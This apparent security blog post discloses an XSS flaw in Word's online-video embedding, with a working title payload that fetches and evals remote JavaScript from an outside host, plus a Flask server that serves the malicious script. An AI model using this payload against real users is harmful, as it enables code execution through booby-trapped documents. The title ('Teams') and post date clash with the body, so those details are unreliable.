---
layout: post
title:  "2022 Microsoft Teams RCE"
date:   2023-01-17 00:18:20 +0900
---

# Summary

In the server, when parsing a video from a link designated by an attacker, a malicious payload included in the video title can trigger an XSS (Cross-site Scripting) attack, allowing the execution of arbitrary Javascript code.

# The Basics

- **Product:** Office Word, including Office 365 Word
- **Tested Version:** Microsoft Word for Microsoft 365 MSO (Version 2306 Build 16.0.16529.20164) 64-bit
- **Bug-class**: XSS(Cross-Site Scripting)

# The Vulnerability

  Various Office products, including MS Word, allow users to insert desired external videos into documents via the "Online Videos" tab.

![pic1.jpg](office/pic1.jpg)

  When a user plays an external video embedded in a document, Office checks whether the provider of the external video is trustworthy, such as YouTube. This check is performed by applying the following regular expression to the URL.

```python
https?://(www\.)?youtube\.\w{2,3}/.*|https?://(www\.)?youtube-nocookie\.\w{2,3}/.*|https?://youtu\.be/.*|https?://(player\.)?vimeo\.com/.*|https?://(\w+\.)?slideshare\.net/.*|https?://(\w+\.)?microsoftstream\.com/.*
```

  If it is deemed trustworthy, it sends a request like the following to fetch data such as the video's title or thumbnail.

```python
GET https://hubble.officeapps.live.com/mediasvc/api/media/oembed?url=https%3A%2F%2Fwww.youtube.com%2Fembed%2FGX2nEmvxK-4%3Ffeature%3Doembed&streamsso=true&lcid=1033&syslcid=1042&uilcid=1033&app=0&ver=16&build=16.0.16529&platform=Win32 HTTP/1.1
Connection: Keep-Alive
Accept-Encoding: gzip
User-Agent: Microsoft Office/16.0 (Windows NT 10.0; Microsoft Word 16.0.16529; Pro)
X-IDCRL_ACCEPTED: t
X-Office-Version: 16.0.16529
X-Office-Application: 0
X-Office-Platform: Win32
X-Office-AudienceGroup: Production
X-Office-SessionId: DE75B69F-49BA-4D92-BD45-2B02504B4021
Host: hubble.officeapps.live.com
```

  The server at [hubble.officeapps.live.com](http://hubble.officeapps.live.com/) responds with information including the video's title, description, and the HTML iframe tag to play the video.

  The vulnerability arises from this iframe tag. The server adds the video's title to the “**title”** attribute of the iframe tag without any validation. As a result, by appropriately using double quotes, one can freely add an **onload** attribute to the iframe tag that the server responds with.

  Below is an example of an [officeapps.live.com](http://officeapps.live.com/) server response to a malicious external video.

```json
{
    "description": "",
    "video_description": "",
    "start_time": null,
    "end_time": null,
    "embed_url": "https://www.youtube.com/embed/GX2nEmvxK-4?feature=oembed",
    "html": "<iframe width=\"200\" height=\"150\" src=\"https://www.youtube.com/embed/GX2nEmvxK-4?feature=oembed\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share\" allowfullscreen=\"\" title=\"\" onload=\"fetch('http://158.247.239.32/a.js').then(function(a){a.text().then(function(a){eval(a)})})\" sandbox=\"allow-scripts allow-same-origin allow-popups\"></iframe>",
    "type": "video",
    "title": "\" onload=\"fetch('http://127.0.0.1/a.js').then(function(a){a.text().then(function(a){eval(a)})})",
    "provider_name": "YouTube",
    "provider_url": "https://www.youtube.com/",
    "thumbnail_url": "https://i.ytimg.com/vi/GX2nEmvxK-4/hqdefault.jpg",
    "thumbnail_width": 480.0,
    "thumbnail_height": 360.0,
    "width": 200.0,
    "height": 150.0
}
```

  Based on this response, Word writes an HTML file to be rendered through **Edge Webview** in the %LOCALAPPDATA%\Microsoft\Windows\INetCache\Content.Word directory.

  As a result, this HTML will include the JS code injected by the attacker. (The logic for this is implemented in wwlib!XszCreateVideoHTML. A detailed analysis of this is beyond the scope of this article.)

  As seen above, the sandbox attribute of the iframe has allow-scripts, allow-same-origin, and allow-popups set. This means that JavaScript can be executed, desired URIs can be run through window.open, or scripts from an external server can be executed via the fetch method.

# Exploit

1. As shown in the example in the vulnerability description, create a YouTube video with a title that includes a payload for inserting the onload attribute.

`" onload="fetch('[http://127.0.0.1/a.js](http://127.0.0.1/a.js)').then(function(a){a.text().then(function(a){eval(a)})})`

1. Click on the Online Videos tab in Word and insert the URL of the malicious video into the document.

![Untitled](office/Untitled.png)

1. Set up a simple web server that allows CORS and responds with malicious javascript, as below. (The example executes calc.exe through the calculator URI Scheme.)

```python
from flask import Flask

app = Flask(__name__)

@app.after_request
def apply_cors(response):
    response.headers['Access-Control-Allow-Origin'] = '*'
    return response

@app.route('/a.js', methods=['GET'])
def exploit():
    return 'window.open("calculator://")'
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```

# Demo

[PoC_Public.mp4](office/PoC_Public.mp4)

# Conclusion

  The vulnerability has shown that an attacker can create a Word document containing a specific video and execute the arbitrary javascript code when playing the video.

  Past critical exploits of Office, such as CVE-2021-40444 and CVE-2022-30190 (Folina), all started with the execution of arbitrary javascript. If it's linked with a new vulnerable URI, like the previously exploited ms-msdt, it could directly lead to a critical RCE (Remote Code Execution) vulnerability.

  Especially as a vulnerability that triggers when a video embedded in Word is played, it's easy for an attacker to induce a user to play the video. Prompt action is required.

# Reference

- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-30190](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-30190)

# TimeLine

- 2023-07-27 Vulnerability reported to MSRC
- 2023-08-25 Recognized as a security vulnerability with a severity of **Critical**
- 2023-09-12 Patched in the latest release
